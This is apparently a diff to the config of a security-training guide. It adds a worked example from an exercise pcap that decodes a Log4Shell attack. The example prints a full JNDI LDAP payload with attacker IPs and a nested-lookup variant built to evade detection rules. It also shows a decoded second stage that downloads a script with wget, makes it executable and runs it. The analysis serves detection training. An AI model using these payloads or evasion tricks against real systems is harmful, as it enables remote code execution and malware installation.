@@ -86,5 +86,18 @@ export default {
         { t: "note", kind: "warn", title: "why $ and ==", text: "Log4Shell payloads use <b>JNDI lookup syntax</b> (<code>${jndi:ldap://...}</code>) — the <code>$</code> is a strong tell. <code>==</code> is base64 padding — attackers often base64-encode the second-stage payload/class reference to dodge naive string-matching WAFs. Both showing up in a UA field (where neither belongs) is the anomaly." },
       ],
     },
+    {
+      title: "Worked example — confirmed exercise pcap",
+      desc: "Real JNDI payload, decoded end to end (packet 444).",
+      span2: true,
+      blocks: [
+        { t: "cmd", label: "the JNDI payload", code: "${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}" },
+        { t: "note", kind: "info", title: "the letter-spelled evasion variant", text: "The same attack often shows up spelling <code>jndi:ldap</code> one letter at a time via nested lookups — <code>${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://...}</code> — specifically to dodge detection rules that string-match the literal word \"jndi\". Log4j still resolves it correctly; naive filters don't catch it." },
+        { t: "cmd", label: "decode the Base64/ segment (strip a trailing } by hand if present — CyberChef's 'Remove non-alphabet chars' does this automatically)", code: "echo \"d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==\" | base64 -d" },
+        { t: "cmd", label: "decoded output", code: "wget http://62.210.130.250/lh.sh; chmod +x lh.sh; ./lh.sh" },
+        { t: "note", kind: "danger", title: "two-stage infrastructure", text: "<code>45.137.21.9:1389</code> = <b>stage 1</b>, the LDAP server Log4j connects to for the malicious JNDI reference. <code>62.210.130.250</code> = <b>stage 2</b>, the actual payload host serving <code>lh.sh</code> — this is the IP a \"which IP did the adversary contact\" question wants, since it only surfaces after decoding, unlike the stage-1 IP which sits in plaintext in the JNDI string." },
+        { t: "note", kind: "ok", title: "chmod +x — same move as FTP's SITE CHMOD", text: "Download → <code>chmod +x</code> → execute is the exact same attacker goal as <code>SITE CHMOD 777</code> in the FTP section: flip the execute bit on a delivered payload so it actually runs. Different transport, same technique." },
+      ],
+    },
   ],
 };
